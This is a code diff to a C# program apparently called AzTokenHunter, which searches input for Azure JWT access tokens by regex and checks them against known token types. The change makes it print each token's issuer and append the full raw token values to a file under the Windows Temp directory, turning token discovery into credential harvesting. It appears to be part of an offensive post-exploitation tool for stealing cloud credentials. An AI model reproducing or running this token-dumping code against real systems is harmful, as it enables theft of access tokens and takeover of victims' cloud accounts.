@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -99,6 +99,7 @@ namespace AzTokenHunter
         public static void FindValidJWTs(string input)
         {
             string pattern = @"\beyJ0[A-Za-z0-9-_]+[A-Za-z0-9-_\.]+[=]?\b";
+            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
             Regex regex = new Regex(pattern);
             MatchCollection matches = regex.Matches(input);
             foreach (Match match in matches)
@@ -111,7 +112,11 @@ namespace AzTokenHunter
                         if(isKnownToken(s))
                         {
                             //Console.WriteLine(String.Format("[+] Found Token {0}: {1}", s, match.Value));
-                            Console.WriteLine(String.Format("[+] Found Token {0}", s));
+                            Console.WriteLine(String.Format("[+] Found Token {0} - {1}", s, jwtToken.Payload.Iss));
+                            String tokenPath = String.Format("{0}\\Temp\\token.out", systemRoot);
+                            using (StreamWriter sw = File.AppendText(tokenPath)) {
+                                sw.WriteLine("{0} - {1} - {2}", s, jwtToken.Payload.Iss, match.Value);
+                            }
                         }
                     }
                 }
